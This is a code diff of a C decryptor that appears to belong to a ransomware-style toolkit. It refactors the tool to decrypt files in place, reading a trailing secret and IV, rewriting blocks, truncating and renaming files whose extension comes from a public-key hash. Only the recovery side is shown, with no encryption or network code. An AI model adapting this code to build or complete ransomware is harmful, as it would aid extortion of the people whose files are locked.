@@ -38,15 +38,13 @@
 #include <stdio.h>
 
 /* shared handler data */
-lp_traverser_t trav;
-
-EVP_PKEY *priv_key   = NULL;
-char      pub_ext[7] = {0};
+static char pub_hash[LP_SHA256_SIZE]; /* public key hash */
+static char pub_ext[7] = {0}; /* file extension (calculated from hash) */
 
 int quit(int code) {
   /* free resources */
-  lp_traverser_free(&trav);
-  lp_rsa_key_free(priv_key);
+  lp_traverser_free();
+  lp_rsa_key_free();
 
   /* exit (should never return) */
   exit(code);
@@ -61,45 +59,51 @@ void signal_handler(int signal) {
 }
 
 void decrypt_handler(char *path) {
-  bool        ret = false;
-  lp_rsa_t    rsa;
-  struct stat st;
-  uint8_t     buf[LP_RSA_BLOCK_SIZE];
+  bool     ret = false;
+  lp_rsa_t rsa;
 
-  /* input file */
-  int   in = -1, in_len = 0, in_file_len = strlen(path);
-  char *in_file = path;
+  /* file stuff */
+  int     fd = -1, in_len = 0, out_len = 0;
+  uint8_t buf[LP_RSA_BLOCK_SIZE];
+  long    size = -1;
 
-  /* output file */
-  int   out = -1, out_len = 0, out_file_len = in_file_len - sizeof(pub_ext);
-  char *out_file = calloc(1, out_file_len + 1);
+  /* path stuff */
+  int   new_path_len = strlen(path) - sizeof(pub_ext);
+  char *new_path     = calloc(1, new_path_len + 1);
 
   /* initialize RSA structure with the private key */
-  lp_rsa_init(&rsa, priv_key);
+  lp_rsa_init(&rsa);
 
-  /* output file name */
-  memcpy(out_file, in_file, out_file_len);
+  /* decrypted file path */
+  memcpy(new_path, path, new_path_len);
 
   /* open the input file */
-  if ((in = open(in_file, O_RDONLY)) < 0) {
-    lp_debug("Failed to open input file %s: %s", in_file, lp_str_error());
-    goto free;
-  }
-
-  /* open the output file */
-  if ((out = open(out_file, O_RDWR | O_CREAT, 0600)) < 0) {
-    lp_debug("Failed to open output file %s: %s", out_file, lp_str_error());
+  if ((fd = open(path, O_RDWR)) < 0) {
+    lp_debug("Failed to open file %s: %s", new_path, lp_str_error());
     goto free;
   }
 
   /* read the secret and the IV */
-  if (read(in, rsa.secret, sizeof(rsa.secret)) <= 0) {
-    lp_debug("Failed to read the secret from %s: %s", in_file, lp_str_error());
+  if ((size = lseek(fd, -(sizeof(rsa.secret) + sizeof(rsa.iv)), SEEK_END)) <
+      0) {
+    lp_debug("Failed to seek to the start of secret in %s: %s",
+        path,
+        lp_str_error());
     goto free;
   }
 
-  if (read(in, rsa.iv, sizeof(rsa.iv)) <= 0) {
-    lp_debug("Failed to read the IV from %s: %s", in_file, lp_str_error());
+  if (read(fd, rsa.secret, sizeof(rsa.secret)) <= 0) {
+    lp_debug("Failed to read the secret from %s: %s", path, lp_str_error());
+    goto free;
+  }
+
+  if (read(fd, rsa.iv, sizeof(rsa.iv)) <= 0) {
+    lp_debug("Failed to read the IV from %s: %s", path, lp_str_error());
+    goto free;
+  }
+
+  if (lseek(fd, 0, SEEK_SET) < 0) {
+    lp_debug("Failed to seek to the start of %s: %s", path, lp_str_error());
     goto free;
   }
 
@@ -110,21 +114,38 @@ void decrypt_handler(char *path) {
   }
 
   /* read from the input file, one block at a time */
-  while ((in_len = read(in, buf, sizeof(buf))) > 0) {
+  while ((in_len = read(
+              fd, buf, (long)sizeof(buf) > size ? (size_t)size : sizeof(buf))) >
+         0) {
+    /* decrease the remaining size (don't accidentally read the secret and IV */
+    size -= in_len;
+
     /* decrypt the full/partial block */
     if (!lp_rsa_decrypt(&rsa, buf, in_len, &out_len)) {
-      lp_debug("Failed to decrypt %s (%lu, %lu)", in_file, in_len, out_len);
+      lp_debug("Failed to decrypt %s (%lu, %lu)", path, in_len, out_len);
+      goto free;
+    }
+
+    /* check the input/output block size */
+    if (out_len > in_len) {
+      lp_debug("Invalid block size for %s: %d > %d", path, out_len, in_len);
+      goto free;
+    }
+
+    /* go back to the start of the block */
+    if (lseek(fd, -in_len, SEEK_CUR) < 0) {
+      lp_debug("Failed to seek to block for %s: %s", path, lp_str_error());
       goto free;
     }
 
     /* write the decrypted full block to the output file */
-    if (out_len != 0 && write(out, buf, out_len) <= 0) {
-      lp_debug("Failed to write output to %s: %s", out_file, lp_str_error());
+    if (out_len != 0 && write(fd, buf, out_len) <= 0) {
+      lp_debug("Failed to write output to %s: %s", path, lp_str_error());
       goto free;
     }
 
     /* check if we read the last block */
-    if (in_len < (int)sizeof(buf))
+    if (size <= 0)
       break;
   }
 
@@ -134,61 +155,55 @@ void decrypt_handler(char *path) {
     goto free;
   }
 
-  if (write(out, buf, out_len) < 0) {
-    lp_debug("Failed to write last block to %s: %s", out_file, lp_str_error());
+  if (write(fd, buf, out_len) < 0) {
+    lp_debug("Failed to write last block to %s: %s", path, lp_str_error());
     goto free;
   }
 
-  /* get and copy the file info */
-  if (fstat(in, &st) < 0) {
-    lp_debug("Failed to get stat of file: %s", in_file);
+  /* remove remaining block data, secret and IV */
+  if ((size = lseek(fd, 0, SEEK_CUR)) < 0) {
+    lp_debug(
+        "Failed to get the current position in %s: %s", path, lp_str_error());
     goto free;
   }
 
-  if (!lp_copy_stat(out, &st)) {
-    lp_debug("Failed to copy perms from %s to %s", out_file, in_file);
+  if (ftruncate(fd, size) != 0) {
+    lp_debug("Failed to truncate %s: %s", path, lp_str_error());
     goto free;
   }
 
-  /* remove the input file */
-  if (unlink(in_file) < 0) {
-    lp_debug("Failed to unlink input file: %s", in_file);
+  /* close the file */
+  close(fd);
+  fd = -1;
+
+  /* rename the file */
+  if (rename(path, new_path) != 0) {
+    lp_debug("Failed to rename file %s to %s", path, new_path);
     goto free;
   }
 
   ret = true;
 
 free:
-  if (in >= 0)
-    close(in);
+  if (fd >= 0)
+    close(fd);
 
-  if (out >= 0)
-    close(out);
+  if (!ret)
+    lp_fail("Failed to decrypt %s", path);
 
-  if (!ret) {
-    lp_fail("Failed to decrypt %s", in_file);
-    unlink(out_file);
-  }
-
-  free(in_file);
-  free(out_file);
+  free(new_path);
   lp_rsa_free(&rsa);
 }
 
 int main(int argc, char *argv[]) {
-  /* signal action */
-  struct sigaction action;
-
-  char hash[LP_SHA256_SIZE], *exts[2];
-  int  i;
+  struct sigaction action;  /* signal action */
+  char            *exts[2]; /* target extension list */
+  int              i;       /* used in loops and stuff */
 
   if (argc <= 1) {
     lp_info("Usage: %s [DIR/FILE]...", argv[0]);
     return EXIT_SUCCESS;
   }
-
-  /* initialize the traverser */
-  lp_traverser_init(&trav);
 
   /* setup the signal handler */
   sigemptyset(&action.sa_mask);
@@ -200,18 +215,18 @@ int main(int argc, char *argv[]) {
   sigaction(SIGQUIT, &action, NULL);
 
   /* load the private RSA key */
-  if (NULL == (priv_key = lp_rsa_key_load())) {
+  if (!lp_rsa_key_load()) {
     lp_fail("Failed to load the private key, is the key valid?");
     quit(EXIT_FAILURE);
   }
 
   /* calculate the public key hash and the extension for the encrypted files */
-  if (NULL == lp_sha256(LP_PUBKEY, hash)) {
+  if (NULL == lp_sha256(LP_PUBKEY, pub_hash)) {
     lp_fail("Failed to calculate hash of the public key");
     quit(EXIT_FAILURE);
   }
 
-  if (snprintf(pub_ext, sizeof(pub_ext), "%.6s", hash) !=
+  if (snprintf(pub_ext, sizeof(pub_ext), "%.6s", pub_hash) !=
       (int)sizeof(pub_ext) - 1) {
     lp_fail("Failed to format the encrypted file extension");
     quit(EXIT_FAILURE);
@@ -221,24 +236,28 @@ int main(int argc, char *argv[]) {
   exts[0] = pub_ext;
   exts[1] = NULL;
 
-  if (!lp_traverser_setup(&trav, LP_THREADS, exts)) {
-    lp_fail("Failed to create traverser: %s", lp_str_error());
+  /*
+
+   * initialize the traverser to find encrypted files (files with pub_ext) and
+   * decrypt them using the decrypt_handler()
+
+  */
+  if (!lp_traverser_init(LP_THREADS, exts, NULL)) {
+    lp_fail("Failed to initialize traverser: %s", lp_str_error());
     quit(EXIT_FAILURE);
   }
 
-  lp_traverser_set_mode(&trav, R_OK | W_OK);
-  lp_traverser_set_handler(&trav, decrypt_handler);
+  lp_traverser_set_mode(R_OK | W_OK);
+  lp_traverser_set_handler(decrypt_handler);
 
   /* traverse & decrypt all the specified dirs/files */
   for (i = 1; i < argc; i++) {
     lp_info("Decrypting %s", argv[i]);
-    lp_traverser_run(&trav, argv[i]);
+    lp_traverser_run(argv[i]);
   }
 
-  if (!lp_traverser_wait(&trav, true)) {
-    lp_fail("Failed to wait for decryption threads: %s", lp_str_error());
-    quit(EXIT_FAILURE);
-  }
+  /* wait for all the threads */
+  lp_traverser_wait(true);
 
   lp_success("Operation completed");
   return quit(EXIT_SUCCESS);
